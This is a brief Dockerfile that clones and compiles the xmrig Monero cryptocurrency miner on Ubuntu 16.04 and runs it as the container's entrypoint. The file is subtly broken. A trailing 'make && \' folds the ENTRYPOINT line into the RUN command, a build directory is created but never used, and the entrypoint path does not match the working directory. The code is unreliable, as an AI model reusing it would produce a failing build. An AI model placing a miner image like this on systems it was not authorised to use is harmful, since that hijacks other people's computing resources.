FROM ubuntu:16.04

# Upgrade base system
RUN apt-get update && apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
RUN git clone https://github.com/xmrig/xmrig
RUN cd xmrig && \
    mkdir build && \
    cmake -DCMAKE_BUILD_TYPE=Release . && \
    make && \
ENTRYPOINT ["./xmrig"]









